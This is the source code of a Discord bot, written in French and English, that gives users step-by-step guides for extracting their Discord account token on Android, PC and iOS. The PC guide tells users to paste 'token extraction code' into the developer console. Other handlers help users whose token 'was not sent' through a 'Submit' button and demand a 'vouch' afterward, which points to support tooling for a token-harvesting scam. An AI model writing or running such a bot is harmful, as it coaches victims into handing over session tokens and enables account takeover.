import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } from 'discord.js';

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const VOUCH_CHANNEL_ID = '1536189878352744458';

// Tutoriels par device
const TUTORIALS = {
  android: {
    name: 'Android',
    url: 'https://discord.com/channels/1534514417306435604/1536550540501319721',
    steps: [
      '1. Download Discord APK',
      '2. Install APK on your device',
      '3. Login to Discord',
      '4. Go to Settings > Developer Mode',
      '5. Enable Developer Mode',
      '6. Go to User Settings > Advanced',
      '7. Copy your token from the token field'
    ]
  },
  pc: {
    name: 'PC',
    url: 'https://discord.com/channels/1534514417306435604/1536550502601588816',
    steps: [
      '1. Open Discord on PC',
      '2. Go to Settings > Developer Mode',
      '3. Enable Developer Mode',
      '4. Right-click on your username',
      '5. Copy ID',
      '6. Open Console (Ctrl+Shift+I)',
      '7. Paste the token extraction code',
      '8. Copy the token from console'
    ]
  },
  ios: {
    name: 'iOS',
    url: 'https://discord.com/channels/1534514417306435604/1536550305981014046',
    steps: [
      '1. Download Discord IPA',
      '2. Install IPA on your iOS device',
      '3. Login to Discord',
      '4. Go to Settings > Developer Mode',
      '5. Enable Developer Mode',
      '6. Go to User Settings > Advanced',
      '7. Copy your token from the token field'
    ]
  }
};

// Créer le client Discord
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`Bot connecté en tant que ${client.user.tag}`);
});

// Commande !token
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  
  const content = message.content.toLowerCase();
  
  // Commande !token
  if (content === '!token' || content === '!help token') {
    const embed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle('🔑 Token Discord - Guide')
      .setDescription('Choisissez votre device pour obtenir le tutoriel:')
      .addFields(
        { name: '📱 Android', value: 'Tutoriel complet pour Android', inline: true },
        { name: '💻 PC', value: 'Tutoriel complet pour PC', inline: true },
        { name: '🍎 iOS', value: 'Tutoriel complet pour iOS', inline: true }
      )
      .setFooter({ text: 'Cliquez sur un bouton pour voir le tutoriel' });

    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setCustomId('token_android')
          .setLabel('Android')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId('token_pc')
          .setLabel('PC')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId('token_ios')
          .setLabel('iOS')
          .setStyle(ButtonStyle.Primary)
      );

    await message.reply({ embeds: [embed], components: [row] });
  }

  // Commande !vouch
  if (content === '!vouch' || content === '!vouch help') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('✅ Système de Vouch')
      .setDescription('Le vouch se fait dans le channel dédié:')
      .addFields(
        { name: '📋 Channel Vouch', value: `[Cliquez ici pour accéder au channel vouch](https://discord.com/channels/1534514417306435604/1536189878352744458)`, inline: false },
        { name: '📝 Comment vouch?', value: '1. Utilisez le bot avec succès\n2. Allez dans le channel vouch\n3. Postez votre expérience\n4. Mentionnez @theotim3637_04894 pour validation', inline: false }
      )
      .setFooter({ text: 'Le vouch est obligatoire après utilisation' });

    await message.reply({ embeds: [embed] });
  }

  // Détection de problème de token non envoyé
  if (content.includes('token') && (content.includes('pas envoyé') || content.includes('not sent') || content.includes('submit') || content.includes('send'))) {
    const embed = new EmbedBuilder()
      .setColor('#ff9900')
      .setTitle('⚠️ Problème de Token')
      .setDescription('Il semble que vous ayez mis votre token mais qu\'il ne s\'est pas envoyé.')
      .addFields(
        { name: '🔧 Solution', value: '1. Vérifiez que vous avez bien cliqué sur "Submit"\n2. Sur mobile, utilisez le bouton "Submit" sous l\'orbe\n3. Sur PC, appuyez sur Entrée après avoir entré le token\n4. Si ça ne marche toujours pas, contactez le support', inline: false },
        { name: '📱 Mobile', value: 'Le bouton "Submit" apparaît uniquement sur mobile', inline: true },
        { name: '💻 PC', value: 'Appuyez sur Entrée après le token', inline: true }
      )
      .setFooter({ text: 'Besoin d\'aide? Tapez !token pour les tutoriels' });

    await message.reply({ embeds: [embed] });
  }
});

// Gestion des interactions boutons
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const device = interaction.customId.replace('token_', '');
  const tutorial = TUTORIALS[device];

  if (tutorial) {
    const embed = new EmbedBuilder()
      .setColor('#0099ff')
      .setTitle(`🔑 Token Discord - ${tutorial.name}`)
      .setDescription(`Tutoriel complet pour ${tutorial.name}:`)
      .addFields(
        { name: '📚 Tutoriel Officiel', value: `[Cliquez ici pour le tutoriel ${tutorial.name}](${tutorial.url})`, inline: false },
        { name: '📋 Étapes:', value: tutorial.steps.join('\n'), inline: false }
      )
      .setFooter({ text: 'Suivez attentivement chaque étape' });

    await interaction.update({ embeds: [embed], components: [] });
  }
});

// Démarrer le bot
if (TOKEN) {
  client.login(TOKEN);
} else {
  console.error('Erreur: DISCORD_BOT_TOKEN non défini dans les variables d\'environnement');
}